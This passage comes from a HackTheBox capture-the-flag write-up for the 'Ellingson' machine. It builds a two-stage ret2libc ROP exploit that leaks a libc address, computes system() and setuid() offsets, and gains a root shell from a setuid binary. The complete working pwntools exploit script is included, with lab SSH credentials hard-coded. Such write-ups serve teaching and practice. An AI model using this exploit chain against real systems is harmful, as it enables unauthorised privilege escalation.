Cool! What can we do after we get an address leak though? We're going to need to figure out the exact addresses of system() in libc. ASLR only affects absolute addresses, not the offsets between addresses of different functions. If we know the address of one function (in this case, puts()), and we know the offsets of all other functions, we can calculate the absolute address of other functions such as system().

How can we do that? Fortunately, we have access to the readelf command on the remote server. Let's first see where the libc.so.6 binary is linked to /usr/bin/garbage:

```
margo@ellingson:~$ ldd /usr/bin/garbage
	linux-vdso.so.1 (0x00007ffc9939e000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007ff5d6fbe000)
	/lib64/ld-linux-x86-64.so.2 (0x00007ff5d73af000)
```

Ok. Next, let's use `readelf -s` on the binary, and grep for the offsets that we need!

```
margo@ellingson:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -w puts@
   422: 00000000000809c0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
margo@ellingson:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep -w system@
  1403: 000000000004f440    45 FUNC    WEAK   DEFAULT   13 system@@GLIBC_2.2.5
margo@ellingson:~$ 
```

What about the /bin/sh string? Does that even exist in libc?

Turns out, the system() function does need that string to function. We can therefore use `strings -tx` on the libc, and grep for /bin/sh.

```
margo@ellingson:~$ strings -tx /lib/x86_64-linux-gnu/libc.so.6 | grep /bin/sh
 1b3e9a /bin/sh
margo@ellingson:~$ 
```

Our next part of the exploit will look like this:
```python=
puts_offset = 0x809c0
system_offset = 0x4f440
binsh_offset = 0x1b3e9a
```

Now let's overflow! Let's prepare our stage 1 payload to leak the address of libc. To do that, we need to fill the buffer with 136 A's, then the address of the pop rdi;ret gadget to set the parameter equal to the global offset table of puts, then the address of puts() to print the address out, and back to auth() so we can send out stage 2. Pwntool's p64() function will be handy to encode our addresses into 64-bit little endian mode:

```python=
payload = "A"*136
payload += p64(pop_rdi_gadget)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(auth)

sh.sendline(payload)
sh.recvline()
sh.recvline()
```

(note: we call sh.recvline() twice since there's two new lines we need to go over before we get to the address leak.)

Now let's capture the leaked address. How can we calculate the address of system using the offsets though?

Turns out, the offsets gained from readelf indicates the offset to the libc base, which is the lowest address in which the libc is loaded. It's an address that always end in three 0's, (since linux memory pages are 4 KBs in size -> 2^12). We can calculate the libc base address by subtracting the leaked puts() address with the offset of puts, and then get the address of system by adding the system_offset to the calculated libc base. The same is done for the /bin/sh string:

```python=
puts = u64(sh.recv(6).ljust(8, '\x00'))
libc_base = puts - puts_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset

log.success("Address of puts in libc: " + hex(puts))
log.success("Address of libc base: " + hex(libc_base))
log.success("Address of system in libc: " + hex(system))
log.success("Address of binsh string in libc: " + hex(binsh))
```

Alright, time for stage 2! Since we returned back to auth(), we can fill the buffer up using 136 A's again! We'll overwrite the return address with the pop rdi; ret gadget, except this time our parameter is the address of the /bin/sh string instead. Our next address is the address of system, and so after the parameter is set, we essentially call system("/bin/sh"), giving us a shell!

```python=
payload = "B"*136
payload += p64(pop_rdi_gadget)
payload += p64(binsh)
payload += p64(system)

sh.sendline(payload)
sh.interactive()
```

Our exploit.py script so far is as follows:
```python
from pwn import *

#Define global vars below:
pop_rdi_gadget = 0x40179b
puts_got = 0x404028
puts_plt = 0x401050
auth = 0x401513

login = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
sh = login.process('/usr/bin/garbage')
puts_offset = 0x809c0
system_offset = 0x4f440
binsh_offset = 0x1b3e9a


payload = "A"*136
payload += p64(pop_rdi_gadget)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(auth)

sh.sendline(payload)
sh.recvline()
sh.recvline()

puts = u64(sh.recv(6).ljust(8, '\x00'))
libc_base = puts - puts_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset

log.success("Address of puts in libc: " + hex(puts))
log.success("Address of libc base: " + hex(libc_base))
log.success("Address of system in libc: " + hex(system))
log.success("Address of binsh string in libc: " + hex(binsh))

payload = "B"*136
payload += p64(pop_rdi_gadget)
payload += p64(binsh)
payload += p64(system)

sh.sendline(payload)
sh.interactive()
```

Sweet! Executing this should give us a nice root shell!.....

![alt text](imgs/fail.PNG "Nope!")

......or not.

## One final obstacle

What went wrong? Our leaked addresses made sense, so why did we get the EOF error?
This issue took me a while to solve. The answer, however, was simple:
* We weren't actually executing as the root user

Turns out, setuid binaries only give the capability of running something as the root user, but doesn't gurantee it. If the binary doesn't set its effective user ID, then the special permissions are dropped.

However, there is a function in libc called setuid(), which takes in one parameter, an integer. If that integer is 0, then after the setuid() function returns, program execution resumes in the context of the user who owns the binary. In this case, since the root user owns this binary, calling setuid(0) will cause the rest of the program to be executed as root.

Therefore, we just need to find one more offset to setuid within libc:
```
margo@ellingson:~$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep setuid@
    23: 00000000000e5970   144 FUNC    WEAK   DEFAULT   13 setuid@@GLIBC_2.2.5
margo@ellingson:~$ 
```
Our final exploit script (including stuff I added to debug the binary locally) is this:
```python=
from pwn import *

#Define global vars below:
type = 1 #Change this to 1 when exploiting remotely, otherwise leave it as 0
pop_rdi_gadget = 0x40179b
puts_got = 0x404028
puts_plt = 0x401050
auth = 0x401513

if type == 1:
	login = ssh(host='10.10.10.139', user='margo', password='iamgod$08')
	sh = login.process('/usr/bin/garbage')
	puts_offset = 0x809c0
	system_offset = 0x4f440
	binsh_offset = 0x1b3e9a

	setuid_offset = 0xe5970

else:
	sh = process('./garbage')
	puts_offset = 0x71b80
	system_offset = 0x44c50
	binsh_offset = 0x181519



payload = "A"*136
payload += p64(pop_rdi_gadget)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(auth)

sh.sendline(payload)
sh.recvline()
sh.recvline()

puts = u64(sh.recv(6).ljust(8, '\x00'))
libc_base = puts - puts_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset
setuid = libc_base + setuid_offset

log.success("Address of puts in libc: " + hex(puts))
log.success("Address of libc base: " + hex(libc_base))
log.success("Address of setuid in libc: " + hex(setuid))
log.success("Address of system in libc: " + hex(system))
log.success("Address of binsh string in libc: " + hex(binsh))

payload = "B"*136
payload += p64(pop_rdi_gadget)
payload += p64(0x0)
payload += p64(setuid)

payload += p64(pop_rdi_gadget)
payload += p64(binsh)
payload += p64(system)

sh.sendline(payload)
sh.interactive()
```

Run the exploit, and we get the root shell back :)

![alt text](imgs/rooted.PNG "*rootdances*")

Thank you [@Ic3M4n](https://www.hackthebox.eu/home/users/profile/30224) and HackTheBox for a very cool server! Having the binary exploitation background knowledge definitely helps, and this box would have been a lot harder without it!

Also this quote at the end is legit :P
![alt text](imgs/quote.PNG "quote")
